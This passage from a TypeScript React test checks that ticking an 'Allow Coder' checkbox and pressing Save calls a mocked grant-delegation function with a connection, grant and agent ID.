    const agentCheckbox = document.body.querySelector<HTMLElement>('[aria-label="Allow Coder"]');
    expect(agentCheckbox).toBeTruthy();
    await act(async () => {
      agentCheckbox?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await act(async () => {
      Array.from(document.body.querySelectorAll("button"))
        .find((button) => button.textContent?.trim() === "Save")
        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    expect(createConnectionGrantDelegationMock).toHaveBeenCalledWith(
      "conn-1",
      "grant-user",
      "agent-1",
    );
  });
});
